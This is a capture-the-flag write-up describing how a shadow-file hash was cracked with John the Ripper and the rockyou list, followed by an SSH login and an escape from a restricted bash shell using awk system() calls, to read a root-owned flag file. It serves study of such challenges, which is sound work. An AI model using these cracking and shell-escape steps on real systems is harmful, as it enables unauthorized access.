# 21 Fun With Shells

You found an etc/shadow file for a host listening on ssh at secconctf-2020.example.com 9008 .

Maybe there is flag.txt that will rockyou on that host.

# Design

The challenge provides a copy of an /etc/shadow file and a host running SSH.

# Write-up
The etc/shadow file contained 26 users. But only the "audit" user had a hash.

The challenge text implied we need to use the well-known rockyou password list.

The password was found as-is using john & rockyou.txt:

```Shell
$ ~/github.com/JohnTheRipper/run/john --wordlist=/usr/share/wordlists/rockyou.txt etc-shadow
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:06 0.20% (ETA: 12:09:21) 0g/s 5731p/s 5731c/s 5731C/s keyonna..isabella2
0g 0:00:00:10 0.33% (ETA: 12:11:01) 0g/s 5584p/s 5584c/s 5584C/s 052904..jacoblee
sainsburys       (audit)
1g 0:00:00:18 DONE (2020-10-29 11:20) 0.05408g/s 5441p/s 5441c/s 5441C/s shunda..mikeyd
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Logging into the host we are presented with a restricted shell (rshell):

```Shell
# ssh -p 9008 audit@secconctf-2020.example.com
audit@secconctf-2020.example.com's password:
rbash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Your choices are:
1       See system uptime
2       See who's logged in
3       See current processes
4       Top Resources
s       Shell
h       Repeat this help
q       Quit
```

The first few commands don't really reveal anything useful or enable anything.
Though #3 will show the script used for the login prompt:

```Shell
Your choice: 3

USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  72304  6364 ?        Ss   02:03   0:00 /usr/sbin/sshd -D
root      1050  0.0  0.0 107988  7116 ?        Ss   02:49   0:00 sshd: audit [priv]
audit     1073  0.0  0.0 109464  5956 ?        S    02:50   0:00 sshd: audit@pts/0
audit     1075  0.0  0.0   9920  2848 pts/0    Ss   02:50   0:00 /bin/bash /usr/local/bin/audit-forced.sh
audit     1096  0.0  0.0  18620  3552 pts/0    S+   02:50   0:00 rbash
root      1864  0.1  0.0 105876  6996 ?        Ss   03:19   0:00 sshd: audit [priv]
sshd      1865  0.0  0.0  72304  3036 ?        S    03:19   0:00 sshd: audit [net]
root      1866  0.0  0.0 105692  7096 ?        Ss   03:19   0:00 sshd: audit [priv]
root      1868  0.1  0.0 105876  7036 ?        Ss   03:19   0:00 sshd: audit [priv]
sshd      1869  0.0  0.0  72304  3036 ?        S    03:19   0:00 sshd: audit [net]
audit     1891  0.0  0.0 108336  6148 ?        R    03:19   0:00 sshd: audit@pts/1
audit     1892  0.0  0.0   9920  2708 pts/1    Ss+  03:19   0:00 /bin/bash /usr/local/bin/audit-forced.sh
audit     1895  0.0  0.0  34404  2912 pts/1    R+   03:19   0:00 ps aux
```

Using the "s" option to load a shell we can only run a few commands.

One command that worked was `less` which supports running commands, but they
are also restricted by rbash to it wasn't helpful.

Using `less /usr/local/bin/audit-forced.sh` I reviewed the file for any
weaknesses that perhaps could be exploited.

The following part of the choices seemed interesting:

```Shell
    *)
      echo "Invalid choice '$ans': please try again"
      echo "$HELP"
      ;;
```

Perhaps there is some way to break out of the `echo` with my user supplied
input we could run another command in this context.

But I decided to turn my attention to rbash and looked up common escape methods.

From that I found I could use awk to make system calls to run other commands,
both of these methods worked:

```Shell
awk 'BEGIN {system("/bin/sh")}'
awk 'BEGIN {system("/bin/bash")}'
```

Then I used find to locate the flag:

```Shell
audit@64a2089a00df:~$ /usr/bin/find / -name flag.txt
[snip]
/root/flag.txt
audit@64a2089a00df:~$ /bin/cat /root/flag.txt
```
